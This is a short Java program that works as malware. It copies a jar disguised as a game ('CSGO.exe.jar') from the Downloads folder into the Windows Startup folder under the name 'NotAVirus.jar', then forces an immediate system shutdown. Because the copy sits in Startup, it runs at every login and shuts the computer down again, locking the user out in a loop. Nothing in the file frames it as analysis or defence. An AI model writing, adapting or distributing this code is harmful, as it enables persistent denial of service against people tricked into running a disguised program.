import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

public class Main {

	public static void main(String[] args) throws IOException {
		File source = new File("C:\\Users\\"+System.getProperty("user.name")+"\\Downloads\\CSGO.exe.jar");
		File dest = new File("C:\\Users\\"+System.getProperty("user.name")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NotAVirus.jar");
		
		copyFile(source, dest);
		Runtime.getRuntime().exec("shutdown.exe -s -t 0");
	}

	private static void copyFile(File source, File dest) throws IOException {
		if(!dest.exists() && source.exists())
			Files.copy(source.toPath(), dest.toPath());
	}
}
